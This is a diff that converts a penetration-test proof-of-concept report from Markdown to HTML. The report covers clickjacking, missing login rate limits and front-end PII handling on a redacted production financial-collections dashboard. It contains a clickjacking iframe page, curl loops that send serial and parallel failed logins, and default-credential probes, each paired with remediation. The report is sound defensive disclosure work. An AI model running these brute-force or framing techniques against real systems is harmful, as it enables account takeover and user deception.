@@ -5,290 +5,206 @@ poc_num: "05"
 target: "[REDACTED] - production web dashboard (financial-collections app)"
 category: "Web Application"
 severity: "Medium"
-severity_note: "Severity is researcher-assessed based on observed conditions, not a vendor rating."
-impact: "Clickjacking attack surface and credential brute-force window against production login interface."
 status: "Proven"
 ---
 
-## Summary
+<section id="summary">
+    <div class="sec-head"><span class="sec-num">01</span><h2>Summary</h2></div>
+    <p>The target's login interface ships <strong>no browser-side framing protection</strong> (no
+      <code class="inline">X-Frame-Options</code>, no <code class="inline">CSP: frame-ancestors</code>), allowing the login
+      page to be embedded in an attacker-controlled <code class="inline">&lt;iframe&gt;</code> for clickjacking. Independently,
+      the login API enforces <strong>no rate-limiting or lockout</strong>, leaving it open to unthrottled credential
+      brute-force and password spraying. Both were confirmed by live execution.</p>
+    <p class="muted">A secondary review of the public JavaScript bundle surfaced sensitive logic and PII handling that should
+      live server-side - recorded as lower-severity latent risks that amplify the two primary findings.</p>
+  </section>
 
-    
-The target's login interface ships **no browser-side framing protection** (no
-      `X-Frame-Options`, no `CSP: frame-ancestors`), allowing the login
-      page to be embedded in an attacker-controlled `<iframe>` for clickjacking. Independently,
-      the login API enforces **no rate-limiting or lockout**, leaving it open to unthrottled credential
-      brute-force and password spraying. Both were confirmed by live execution.
+  <section id="scope">
+    <div class="sec-head"><span class="sec-num">02</span><h2>Authorization Status &amp; Scope</h2></div>
+    <table><tbody>
+      <tr><td class="k">Authorization status</td><td>Authorized testing - scope-strict, no-DoS</td></tr>
+      <tr><td class="k">Discovery method</td><td>Black-box, external, actual command execution</td></tr>
+      <tr><td class="k">Authentication bypassed</td><td class="no">NO - no credentials compromised</td></tr>
+      <tr><td class="k">Testing environment</td><td>Production, no data modification</td></tr>
+      <tr><td class="k">Evidence</td><td>Actual command transcript - not reconstructed, not simulated</td></tr>
+      <tr><td class="k">Data modified or destroyed</td><td class="no">NO</td></tr>
+      <tr><td class="k">Target identified here</td><td class="no">NO</td></tr>
+    </tbody></table>
+  </section>
 
-    
-A secondary review of the public JavaScript bundle surfaced sensitive logic and PII handling that should
-      live server-side - recorded as lower-severity latent risks that amplify the two primary findings.
+  <section id="overview">
+    <div class="sec-head"><span class="sec-num">03</span><h2>Findings overview</h2></div>
+    <table><thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Status</th></tr></thead><tbody>
+      <tr><td>1</td><td>Clickjacking - login page can be framed</td><td class="sev med">Medium</td><td class="st">PROVEN</td></tr>
+      <tr><td>2</td><td>No brute-force / rate-limit on login</td><td class="sev med">Medium</td><td class="st">PROVEN</td></tr>
+      <tr><td>3</td><td>Self-signed TLS certificate</td><td class="sev low">Low</td><td class="st">CONFIRMED</td></tr>
+      <tr><td>4</td><td>Server version disclosure</td><td class="sev info">Info</td><td class="st">CONFIRMED</td></tr>
+      <tr><td>+</td><td>Sensitive logic &amp; PII in front-end bundle</td><td class="sev low">Low</td><td class="st">CONFIRMED</td></tr>
+    </tbody></table>
+  </section>
 
-  
-
-  
-    02
-## Authorization Status & Scope
-
-    
-      Authorization statusAuthorized testing - scope-strict, no-DoS
-      Discovery methodBlack-box, external, actual command execution
-      Authentication bypassedNO - no credentials compromised
-      Testing environmentProduction, no data modification
-      EvidenceActual command transcript - not reconstructed, not simulated
-      Data modified or destroyedNO
-      Target identified hereNO
-    
-  
-
-  
-    03
-## Findings overview
-
-    #FindingSeverityStatus
-      1Clickjacking - login page can be framedMediumPROVEN
-      2No brute-force / rate-limit on loginMediumPROVEN
-      3Self-signed TLS certificateLowCONFIRMED
-      4Server version disclosureInfoCONFIRMED
-      +Sensitive logic & PII in front-end bundleLowCONFIRMED
-    
-  
-
-  
-    04
-## Finding 1 - Clickjacking via missing framing headers [Medium]
-
-    
-Severity: Medium - researcher-assessed. Clickjacking requires the victim to interact with the page; impact is limited and user-gated.
-
-    
-### step 1 - verify security headers
-
-    bash
-
-$ curl -k -sS -D - -o /dev/null https://TARGET/login | head -20
-HTTP/1.1 200 OK
+  <section id="f1">
+    <div class="sec-head"><span class="sec-num">04</span><h2>Finding 1 - Clickjacking via missing framing headers <span style="color:var(--amber);font-family:var(--mono);font-size:14px;">[Medium]</span></h2></div>
+    <p class="muted">Severity: Medium - researcher-assessed. Clickjacking requires the victim to interact with the page; impact is limited and user-gated.</p>
+    <h3><span class="step-n">step 1 -</span> verify security headers</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>bash</span></div>
+<pre><span class="cmd">$ curl -k -sS -D - -o /dev/null https://TARGET/login | head -20</span>
+<span class="out">HTTP/1.1 200 OK
 Server: nginx/1.28.x (Ubuntu)
 Content-Type: text/html
-Connection: keep-alive
-(no X-Frame-Options)
+Connection: keep-alive</span>
+<span class="hl-red">(no X-Frame-Options)
 (no Content-Security-Policy)
 (no Strict-Transport-Security)
-(no X-Content-Type-Options)
-
-    
-The server returns 200 OK with default nginx headers and none of the anti-framing controls. The browser receives no
-      instruction preventing this page from loading in an iframe on any origin.
-
-    
-### step 2 - corroborate with nuclei
-
-    bash
-
-$ nuclei -u https://TARGET -silent -t http/ -timeout 10 -c 15
-[http-missing-security-headers:x-frame-options]        [info]
+(no X-Content-Type-Options)</span></pre></div>
+    <p>The server returns 200 OK with default nginx headers and none of the anti-framing controls. The browser receives no
+      instruction preventing this page from loading in an iframe on any origin.</p>
+    <h3><span class="step-n">step 2 -</span> corroborate with nuclei</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>bash</span></div>
+<pre><span class="cmd">$ nuclei -u https://TARGET -silent -t http/ -timeout 10 -c 15</span>
+<span class="hl-red">[http-missing-security-headers:x-frame-options]        [info]
 [http-missing-security-headers:content-security-policy] [info]
-[http-missing-security-headers:strict-transport-security] [info]
-[waf-detect:nginxgeneric] [info]
-[self-signed-ssl] [ssl] [low]
-
-    
-### step 3 - proof-of-concept frame
-
-    attacker page - clickjack.html
-
-# target embedded in a transparent overlay
-<div style="position:relative;width:460px;height:480px">
-  <iframe src="https://TARGET/login"
-          style="position:absolute;inset:0;width:460px;height:480px;border:0">
-  </iframe>
-</div>
-# rendered in headless Chrome - accessibility snapshot:
-iframe
+[http-missing-security-headers:strict-transport-security] [info]</span>
+<span class="out">[waf-detect:nginxgeneric] [info]
+[self-signed-ssl] [ssl] [low]</span></pre></div>
+    <h3><span class="step-n">step 3 -</span> proof-of-concept frame</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>attacker page - clickjack.html</span></div>
+<pre><span class="cmt"># target embedded in a transparent overlay</span>
+&lt;div style="position:relative;width:460px;height:480px"&gt;
+  &lt;iframe src="https://TARGET/login"
+          style="position:absolute;inset:0;width:460px;height:480px;border:0"&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+<span class="cmt"># rendered in headless Chrome - accessibility snapshot:</span>
+<span class="out">iframe
  └─ heading  "Dashboard"
  └─ textbox  "Username"
  └─ textbox  "Password"
- └─ button   "Sign in"
+ └─ button   "Sign in"</span></pre></div>
+    <p>The login form renders fully inside the attacker's iframe. An attacker can overlay decoy UI to trick an authenticated
+      user into unintended actions on the real interface (UI redress / clickjacking).</p>
+    <figure><img src="poc-05-clickjack.png" alt="Target login page rendered inside an attacker-controlled iframe; product name and logo redacted" /><figcaption>Figure 1 - the target login page rendered inside an attacker-controlled iframe (product name and logo redacted). The red dashed border marks the attacker page's iframe container.</figcaption></figure>
+    <div class="callout fix"><span class="label">Remediation</span>
+      Return <code class="inline">Content-Security-Policy: frame-ancestors 'none'</code> (or an explicit allow-list) and
+      <code class="inline">X-Frame-Options: DENY</code> for legacy browsers on every response. Add
+      <code class="inline">Strict-Transport-Security</code> and <code class="inline">X-Content-Type-Options: nosniff</code>.
+    </div>
+  </section>
 
-    
-The login form renders fully inside the attacker's iframe. An attacker can overlay decoy UI to trick an authenticated
-      user into unintended actions on the real interface (UI redress / clickjacking).
-
-    
-![Target login page rendered inside an attacker-controlled iframe; product name and logo redacted](/poc-05-clickjack.png)
-Figure 1 - the target login page rendered inside an attacker-controlled iframe (product name and logo redacted). The red dashed border marks the attacker page's iframe container.
-    Remediation
-      Return `Content-Security-Policy: frame-ancestors 'none'` (or an explicit allow-list) and
-      `X-Frame-Options: DENY` for legacy browsers on every response. Add
-      `Strict-Transport-Security` and `X-Content-Type-Options: nosniff`.
-    
-  
-
-  
-    05
-## Finding 2 - No brute-force protection on login [Medium]
-
-    
-Severity: Medium - researcher-assessed. The login endpoint is unauthenticated, without rate-limit or lockout, enabling credential brute-force.
-
-    
-### step 1 - repeated failed logins, same source
-
-    bash
-
-$ for i in $(seq 1 20); do
+  <section id="f2">
+    <div class="sec-head"><span class="sec-num">05</span><h2>Finding 2 - No brute-force protection on login <span style="color:var(--amber);font-family:var(--mono);font-size:14px;">[Medium]</span></h2></div>
+    <p class="muted">Severity: Medium - researcher-assessed. The login endpoint is unauthenticated, without rate-limit or lockout, enabling credential brute-force.</p>
+    <h3><span class="step-n">step 1 -</span> repeated failed logins, same source</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>bash</span></div>
+<pre><span class="cmd">$ for i in $(seq 1 20); do
     curl -k -sS -o /dev/null -w "%{http_code} " \
       -X POST https://TARGET/api/v1/auth/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"admin","password":"wrong'$i'"}'
-  done
-401 401 401 401 401 401 401 401 401 401
-401 401 401 401 401 401 401 401 401 401
-# 20 consecutive failures - no 429, no lockout, no delay
-
-    
-### step 2 - confirm no rate-limit ceiling
-
-    bash
-
-$ seq 1 60 | xargs -P10 -I{} curl -k -sS -o /dev/null -w "%{http_code}\n" \
+  done</span>
+<span class="out">401 401 401 401 401 401 401 401 401 401
+401 401 401 401 401 401 401 401 401 401</span>
+<span class="hl-red"># 20 consecutive failures - no 429, no lockout, no delay</span></pre></div>
+    <h3><span class="step-n">step 2 -</span> confirm no rate-limit ceiling</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>bash</span></div>
+<pre><span class="cmd">$ seq 1 60 | xargs -P10 -I{} curl -k -sS -o /dev/null -w "%{http_code}\n" \
     -X POST https://TARGET/api/v1/auth/login \
     -H 'Content-Type: application/json' \
-    -d '{"username":"kolektor","password":"x{}"}' | sort | uniq -c
-     60 401
-# 60 parallel attempts, still 100% served - no throttling
-
-    
-### step 3 - default-credentials probe
-
-    bash
-
-admin / admin      -> 401
+    -d '{"username":"kolektor","password":"x{}"}' | sort | uniq -c</span>
+<span class="out">     60 401</span>
+<span class="hl-red"># 60 parallel attempts, still 100% served - no throttling</span></pre></div>
+    <h3><span class="step-n">step 3 -</span> default-credentials probe</h3>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>bash</span></div>
+<pre><span class="out">admin / admin      -> 401
 admin / password   -> 401
-superadmin / admin -> 401
-# no default credentials in use - good. brute-force surface remains open.
-
-    Remediation
+superadmin / admin -> 401</span>
+<span class="cmt"># no default credentials in use - good. brute-force surface remains open.</span></pre></div>
+    <div class="callout fix"><span class="label">Remediation</span>
       Enforce server-side rate-limiting per IP and per account, return 429 beyond a threshold, add exponential backoff and
       temporary lockout, and log/alert on bursts. Pair with CAPTCHA or MFA on the authentication path.
-    
-  
+    </div>
+  </section>
 
-  
-    06
-## Findings 3 & 4 - TLS & version disclosure [Low / Info]
+  <section id="f34">
+    <div class="sec-head"><span class="sec-num">06</span><h2>Findings 3 &amp; 4 - TLS &amp; version disclosure <span style="color:var(--cyan);font-family:var(--mono);font-size:14px;">[Low / Info]</span></h2></div>
+    <p><strong>Self-signed TLS certificate.</strong> Clients cannot validate server identity and users are conditioned to
+      bypass certificate warnings, weakening resistance to an on-path MitM. <span class="muted">Rated Low: requires a
+      privileged network position.</span></p>
+    <p><strong>Server version disclosure.</strong> The <code class="inline">Server</code> header, error pages, and SSH banner
+      expose exact versions, handing an attacker a precise target to match against known CVEs. <span class="muted">Rated
+      Info: reconnaissance value only.</span> Remediation: <code class="inline">server_tokens off</code> and minimize banners.</p>
+  </section>
 
-    
-**Self-signed TLS certificate.** Clients cannot validate server identity and users are conditioned to
-      bypass certificate warnings, weakening resistance to an on-path MitM. Rated Low: requires a
-      privileged network position.
-
-    
-**Server version disclosure.** The `Server` header, error pages, and SSH banner
-      expose exact versions, handing an attacker a precise target to match against known CVEs. Rated
-      Info: reconnaissance value only. Remediation: `server_tokens off` and minimize banners.
-
-  
-
-  
-    07
-## Finding + - Sensitive logic & PII in the front-end bundle [Low]
-
-    
-Source: the application's JavaScript bundle is downloadable unauthenticated. Static review revealed design
-      choices that belong on the server. Reported as a latent risk that amplifies findings 1 and 2.
-
-    
-### a - role logic enforced client-side
-
-    
-Role names and access hierarchy (including a role that bypasses all client-side guards) are implemented in the bundle.
+  <section id="fplus">
+    <div class="sec-head"><span class="sec-num">07</span><h2>Finding + - Sensitive logic &amp; PII in the front-end bundle <span style="color:var(--cyan);font-family:var(--mono);font-size:14px;">[Low]</span></h2></div>
+    <p class="muted">Source: the application's JavaScript bundle is downloadable unauthenticated. Static review revealed design
+      choices that belong on the server. Reported as a latent risk that amplifies findings 1 and 2.</p>
+    <h3>a - role logic enforced client-side</h3>
+    <p>Role names and access hierarchy (including a role that bypasses all client-side guards) are implemented in the bundle.
       Any visitor can read the full role model, and client-side role checks can be bypassed by editing local state.
-      Authorization must be enforced server-side on every privileged route.
-
-    
-### b - PII passed through URL query parameters
-
-    
-Record detail views pass debtor PII - name, address, GPS coordinates - as URL query parameters, which land in server
-      access logs, browser history, and the Referer header.
-
-    observed pattern (values redacted)
-
-/records/<id>/play?name=<REDACTED>&customerid=<REDACTED>
-   &lat=<REDACTED>&long=<REDACTED>&address=<REDACTED>
-# PII should never travel in the URL - fetch by ID, return in the HTTPS body
-
-    
-### c - user profile (incl. role) in localStorage
-
-    
-The authenticated profile, including role, is persisted in `localStorage` where it is
-      trivially readable and editable - the mechanism by which the client-side role checks in (a) are defeated.
-
-    Remediation
+      Authorization must be enforced server-side on every privileged route.</p>
+    <h3>b - PII passed through URL query parameters</h3>
+    <p>Record detail views pass debtor PII - name, address, GPS coordinates - as URL query parameters, which land in server
+      access logs, browser history, and the Referer header.</p>
+    <div class="code"><div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span>observed pattern (values redacted)</span></div>
+<pre><span class="hl-red">/records/&lt;id&gt;/play?name=&lt;REDACTED&gt;&amp;customerid=&lt;REDACTED&gt;
+   &amp;lat=&lt;REDACTED&gt;&amp;long=&lt;REDACTED&gt;&amp;address=&lt;REDACTED&gt;</span>
+<span class="cmt"># PII should never travel in the URL - fetch by ID, return in the HTTPS body</span></pre></div>
+    <h3>c - user profile (incl. role) in localStorage</h3>
+    <p>The authenticated profile, including role, is persisted in <code class="inline">localStorage</code> where it is
+      trivially readable and editable - the mechanism by which the client-side role checks in (a) are defeated.</p>
+    <div class="callout fix"><span class="label">Remediation</span>
       Move all authorization to the backend; treat the front-end as untrusted. Fetch records by ID and return data only in
       the response body. Keep no authoritative role/permission data in localStorage; rely on short-lived, server-validated tokens.
-    
-  
+    </div>
+  </section>
 
-  
-    08
-## Tested and found safe
+  <section id="safe">
+    <div class="sec-head"><span class="sec-num">08</span><h2>Tested and found safe</h2></div>
+    <table><thead><tr><th>Vector</th><th>Result</th></tr></thead><tbody>
+      <tr><td>SQL injection on login</td><td class="yes">SAFE - generic 401, no error reflection, no bypass</td></tr>
+      <tr><td>Path traversal on record endpoints</td><td class="yes">SAFE - 404 from API; 200s were SPA fallback</td></tr>
+      <tr><td>CORS origin reflection</td><td class="yes">SAFE - no Access-Control-Allow-Origin reflected</td></tr>
+      <tr><td>Username enumeration via timing</td><td class="no">INCONCLUSIVE - network jitter dominates</td></tr>
+      <tr><td>Sensitive file exposure (.env, .git, backups)</td><td class="yes">SAFE - all 200s were SPA fallback</td></tr>
+      <tr><td>Hardcoded secrets in JS bundle</td><td class="yes">SAFE - no keys, JWTs, or private keys found</td></tr>
+    </tbody></table>
+  </section>
 
-    VectorResult
-      SQL injection on loginSAFE - generic 401, no error reflection, no bypass
-      Path traversal on record endpointsSAFE - 404 from API; 200s were SPA fallback
-      CORS origin reflectionSAFE - no Access-Control-Allow-Origin reflected
-      Username enumeration via timingINCONCLUSIVE - network jitter dominates
-      Sensitive file exposure (.env, .git, backups)SAFE - all 200s were SPA fallback
-      Hardcoded secrets in JS bundleSAFE - no keys, JWTs, or private keys found
-    
-  
+  <section id="notclaimed">
+    <div class="sec-head"><span class="sec-num">09</span><h2>Findings not claimed</h2></div>
+    <div class="callout notclaimed"><span class="label">Scope of claims</span>
+      <ul class="tight" style="margin-bottom:0;">
+        <li>No credentials were compromised; no authentication bypass is claimed.</li>
+        <li>The timing side-channel for username enumeration was not confirmed - inconclusive, reported as such.</li>
+        <li>Client-side role-check bypass is demonstrable in principle, but no privileged server-side action was performed, so no privilege-escalation impact is asserted beyond the latent risk described.</li>
+        <li>No data was read, modified, or exfiltrated. PII patterns are inferred from front-end code, not from retrieved records.</li>
+      </ul>
+    </div>
+  </section>
 
-  
-    09
-## Findings not claimed
-
-    Scope of claims
-      
-        
-- No credentials were compromised; no authentication bypass is claimed.
-        
-- The timing side-channel for username enumeration was not confirmed - inconclusive, reported as such.
-        
-- Client-side role-check bypass is demonstrable in principle, but no privileged server-side action was performed, so no privilege-escalation impact is asserted beyond the latent risk described.
-        
-- No data was read, modified, or exfiltrated. PII patterns are inferred from front-end code, not from retrieved records.
-      
-    
-  
-
-  
-    10
-## Conclusion
-
-    
-Two Medium findings - clickjacking via missing framing headers and an unthrottled login endpoint - were proven by live
+  <section id="conclusion">
+    <div class="sec-head"><span class="sec-num">10</span><h2>Conclusion</h2></div>
+    <p>Two Medium findings - clickjacking via missing framing headers and an unthrottled login endpoint - were proven by live
       execution. The front-end architecture issues (client-side role logic, PII in URLs, localStorage) are latent risks that
       amplify the impact if either Medium finding is exploited. No production data was modified, no credentials were
-      compromised, and testing stayed within the agreed no-DoS, scope-strict boundary.
+      compromised, and testing stayed within the agreed no-DoS, scope-strict boundary.</p>
+  </section>
 
-  
+  <section id="refs">
+    <div class="sec-head"><span class="sec-num">11</span><h2>References</h2></div>
+    <ul class="tight">
+      <li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021 - Improper Restriction of Rendered UI Layers (Clickjacking)</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/307.html">CWE-307 - Improper Restriction of Excessive Authentication Attempts</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598 - Use of GET Request With Sensitive Query Strings</a></li>
+      <li><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP A05:2021 - Security Misconfiguration</a></li>
+    </ul>
+  </section>
 
-  
-    11
-## References
+</div>
+<div id="ftr"></div>
+<button class="fab-top" id="fabTop" title="Back to top">&#8593;</button>
 
-    
-      
-- CWE-1021 - Improper Restriction of Rendered UI Layers (Clickjacking)
-      
-- CWE-307 - Improper Restriction of Excessive Authentication Attempts
-      
-- CWE-598 - Use of GET Request With Sensitive Query Strings
-      
-- OWASP A05:2021 - Security Misconfiguration
-    
-  
 
-&#8593;
+</body>
+</html>
